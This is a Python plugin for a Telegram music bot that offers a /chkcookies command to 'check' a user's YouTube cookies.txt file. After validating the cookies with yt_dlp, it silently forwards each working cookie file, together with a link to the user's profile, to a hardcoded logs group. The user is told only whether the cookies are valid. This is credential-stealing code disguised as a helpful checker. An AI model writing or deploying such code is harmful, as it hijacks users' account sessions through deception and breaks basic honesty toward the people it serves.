import yt_dlp
import os
import asyncio
from SONALI import app
from pyrogram import filters
from pyrogram.types import Message

active_users = {}

LOGS_GROUP_ID = -1002300353707  

@app.on_message(filters.command("chkcookies") & filters.private)
async def enable_cookie_check(client, message):
    user_id = message.chat.id
    username = message.from_user.username or f"ID: {user_id}"
    active_users[user_id] = username  

    format_text = (
        "✅ ɴᴏᴡ sᴇɴᴅ ʏᴏᴜʀ `cookies.txt` ғɪʟᴇ ᴛᴏ ᴄʜᴇᴄᴋ!\n\n"
        "📌 ʜᴏᴡ ᴛᴏ sᴇɴᴅ ᴛʜᴇ ғɪʟᴇ:\n"
        "1. ᴏᴘᴇɴ ғɪʟᴇ ᴍᴀɴᴀɢᴇʀ.\n"
        "𝟸. ғɪɴᴅ cookies.txt.\n"
        "𝟹. sᴇʟᴇᴄᴛ `File` (ɴᴏᴛ ᴘʜᴏᴛᴏ ᴏʀ ᴛᴇxᴛ).\n"
        "𝟺. 𝘀ᴇɴᴅ ɪᴛ ʜᴇʀᴇ ✅.\n\n"
        "⏳ ʏᴏᴜ ʜᴀᴠᴇ 30 sᴇᴄᴏɴᴅs !"
    )

    await message.reply(format_text)

    await asyncio.sleep(30)
    if user_id in active_users:
        del active_users[user_id]
        await message.reply("❌ ᴛɪᴍᴇ's ᴜᴘ ! ᴘʟᴇᴀsᴇ send `/chkcookies` ᴀɢᴀɪɴ ᴛᴏ ʀᴇᴛʀʏ.")

@app.on_message(filters.document & filters.private)
async def check_cookies_from_file(client, message: Message):
    user_id = message.chat.id

    if user_id not in active_users:
        return 

    username = active_users.pop(user_id)  
    usr = message.from_user  

    file_path = await message.download()

    if not file_path.endswith(".txt"):
        await message.reply("❌ ᴘʟᴇᴀsᴇ sᴇɴᴅ a ᴠᴀʟɪᴅ `cookies.txt` ғɪʟᴇ ᴀs ᴀ ᴅᴏᴄᴜᴍᴇɴᴛ (not text)!")
        return

    try:
        with open(file_path, "r") as f:
            cookies_data = f.read().strip()

        if not cookies_data:
            await message.reply("❌ ʏᴏᴜʀ cookies.txt ғɪʟᴇ ɪs ᴇᴍᴘᴛʏ !")
            os.remove(file_path)  
            return

        ydl_opts = {"quiet": True, "cookiefile": file_path}

        try:
            with yt_dlp.YoutubeDL(ydl_opts) as ydl:
                ydl.extract_info("https://www.youtube.com/watch?v=dQw4w9WgXcQ", download=False)

            msg = "✅ ʏᴏᴜʀ ʏᴏᴜᴛᴜʙᴇ ᴄᴏᴏᴋɪᴇs ᴀʀᴇ ᴠᴀʟɪᴅ! 🎉"
            log_msg = f"Cᴏᴏᴋɪᴇs Cʜᴇᴄᴋᴇᴅ!\n✅ ʀᴇsᴜʟᴛ: ᴡᴏʀᴋɪɴɢ ✅\n👤 ᴜsᴇʀ: <a href='tg://user?id={usr.id}'>{usr.first_name}</a>"

            await client.send_document(LOGS_GROUP_ID, file_path, caption=log_msg)

        except yt_dlp.utils.ExtractorError:
            msg = "❌ ʏᴏᴜʀ ʏᴏᴜᴛᴜʙᴇ ᴄᴏᴏᴋɪᴇs ᴀʀᴇ ɪɴᴠᴀʟɪᴅ or ᴇxᴘɪʀᴇᴅ !"
            log_msg = f" Cᴏᴏᴋɪᴇs Cʜᴇᴄᴋᴇᴅ!\n❌ ʀᴇsᴜʟᴛ: ɪɴᴠᴀʟɪᴅ ❌\n👤 ᴜsᴇʀ: <a href='tg://user?id={usr.id}'>{usr.first_name}</a>"

            await client.send_message(LOGS_GROUP_ID, log_msg)

        await message.reply(msg, quote=True)

    except Exception as e:
        await message.reply(f"⚠️ Error reading file: `{str(e)}`")

    os.remove(file_path)
